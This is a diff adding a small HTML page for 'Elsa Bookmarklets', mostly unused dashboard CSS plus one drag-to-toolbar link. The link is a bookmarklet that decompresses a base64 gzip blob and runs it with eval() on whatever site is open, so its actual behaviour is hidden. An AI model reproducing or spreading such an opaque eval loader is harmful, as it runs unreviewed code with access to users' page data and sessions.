@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elsa Bookmarklets</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }
+        .dashboard-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .controls-panel {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+        }
+        .control-group {
+            display: inline-block;
+            margin-right: 20px;
+            margin-bottom: 15px;
+            vertical-align: top;
+        }
+        .control-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .control-group select, .control-group input {
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            min-width: 150px;
+        }
+        .search-controls {
+            width: 100%;
+            margin-top: 15px;
+        }
+        .search-input {
+            width: 300px;
+            margin-right: 10px;
+        }
+        .btn {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin: 5px;
+        }
+        .btn:hover {
+            background: #1565c0;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .chart-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin: 20px 0;
+        }
+        .loading {
+            text-align: center;
+            padding: 20px;
+            font-size: 18px;
+            color: #666;
+        }
+        .error {
+            color: #d32f2f;
+            background: #ffebee;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .info-panel {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 10px 0;
+            border-left: 4px solid #1976d2;
+        }
+        h1 {
+            color: #1976d2;
+            text-align: center;
+        }
+        .top-items {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .top-item-card {
+            background: white;
+            padding: 15px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .top-item-card h4 {
+            margin-top: 0;
+            color: #1976d2;
+        }
+        .top-item-list {
+            list-style: none;
+            padding: 0;
+        }
+        .top-item-list li {
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+    </style>
+</head>
+<body>
+  <h2>Click and drag the URLs to your browser bar</h2>
+   <a href="javascript:(function(){let deCoM=((b64)=>{stream = new DecompressionStream('gzip'); w=stream.writable.getWriter();w.write(Uint8Array.from(atob(b64), c => c.charCodeAt(0)));w.close();return new Response(stream.readable).arrayBuffer().then(d=>new TextDecoder().decode(d));});deCoM('H4sIAAAAAAAACqVYbW/bNhD+HP+Ka4vBdhvLctJsgfwCpFm2fkixYklX7Fto8WRxoUmVpGO7Qf77QFGyKNlO3VZJEIt3R949fO6OdLIQsWFSQKyQGHx/++H6H4ZLVJ3UzPmNUUzMuvDYAgDo9+Ey1wKTIswlJRxiKQxhAlWuEUuhTSEZA5XxYo7CBG7uK472rdOm7KHdHeYGuWqgzZpjEGt9iysDY7jLZfbJpGbWvQgStkI63AiMzCIIq3eOiakNLBk1aQSDMPylGkyRzVLTHJ2S+H6m5ELQXiy5VBGo2ZR0wmMofoPzbqX9tccExVU+SegtSJnOOFlHkHBcVcP/LbRhybpngUJhIohRGFSVAuFsJnrM4FzXhXfD1g7Yi3l2Ar8ZOwz8jfozG1BhE8EyZQY92KSiqHqKULbQEZxnK1+26umUULmMIIS32QpOwmy1heuph2u11Qo5MezBW8ooIkop4dxaakCi8TmkjJR8Snx8ipHD0CmUD8TmVXJmf7xwCKVMzCxN6sA0Qcv/QvgBJumMxNibolkiigMI5a0/lcbIeQSDbAVackbhFaV0H5rThTFSaA9JN3Jjoannaxm1DWpw4kc+J2rGhKXD2TYgEQgp9nPrrW8RL5S2SZpJVo8tkcL0NPuKEQxqFj59mskOYXCi64G7EJMF5zpWiOKdEc9QxkFRsqZmFRhcmcsiYcfQ/mMjbO/SbjLNB/kNtGt0C8Pf4ikZQlGwXGq2awHEXGr8Ht9Lg6bbl3a83dD5HmdpfHr29myPs2WekSxDQS9TxmmnhksjH3290pvuFmVZosgcIZEqrwW2r5Wl04Oo0NoPkFMoAXJvz1SEZ5vOWbijEnyD+CGEZY3YSs4bNMAEM4xwsKzPg81ktshsW8WCYEV712g+WtEHSbFTNnR4pgm88ePyYjsPH5bDmqCM7zx8SOuSOVn1SkhO6tGX4sq4Jr6rPtZAd+qWlDHhcccCDT34NcxW3fbQgnIRx3IhjNv4otw7o6pMfFeKPtXwrmx3Y1yZ/zTQg3Av0lbUgLrJm5+E8jCwrlbMwD7EuKWnrqQwhoRw27JLQN/lJQPwwU6XEkE5Kr2jLhJKr6zONdMGBapOO+Ysvm8fQ6cL44mHcWO9F/67DwN0fIm/S/bZsY+V8RMg17ht4WWXp+wAKcvTpngeHtGmME0lXQcK5/IBXe3Lj87FWk9+AbSLgBRep4N8du/A/cz62IQ0gQ4GhqgZGhiPx26GJmSHubkDkn4frnRMMoR7XIORDiOvRDteFDrjff5ZY+tc2ym2f9y/mrZTbEB1j2sql6J9XPNtO0Q3sJlrG/O9E5XIXGiN8ykvD/7zTAoUZnMOK8qJ3xCLkrd1wPd1XBWoXcBqPbU06u5uNY0O06R+aXItCd1qvcCEkfmoc6JU/qSZmIFWMZUxMA0xR2KvMSYlAigxBD79fa3zor7Vycui5ozHUN1bPSAptdzKyAxb23Twoy/pkKspNAslPCrl0uOqpFuuRkXOfotiJSmeWvbZaH9ZoFrfIMfYSHXBeedlLCkGnIjZgsywZ8N52Q0Sqa5InHboePLYOvIP4Qcd747cx2YBt1d9+IxTC4w9jx31+/AnGnd9cimPbjIgggITGpWTFmsTnb8lTNkDp422dM6ZF65YH4OMKBTlSP1t2Dqq6QdupXeYSIUdt9ZxfcogXzMH2ItPiryQjTvYzYE62vpagwZMCFS29Vo7uyF2u1s5C8kMAVdknnGMWv3XraIEmTmvQLtrjV78/tfl7b8fr3LJpDUq/yGhk3ybR4YZjpObfCb4SGY46rshJ8478MQ79NE1PLr7S0LmjK8juFCM8GPQROieRsWSYXW5snfpYVFm7JMO4LE8XL86PT0tZaN+sdCo73wb2ZUKH9LB5D1yLuGzVJy+GPXTQSHJJrcp0zYPCWgXQp51liWgUFBUaMkAxBWDYNTP7Bpu8lHfwWFPqju/VCqg7A5br/ut/wFve7sHgBIAAA==').then(v=>eval(v));})();">Elsa: Make Website View"</a>
+     
+</body>
+</html>
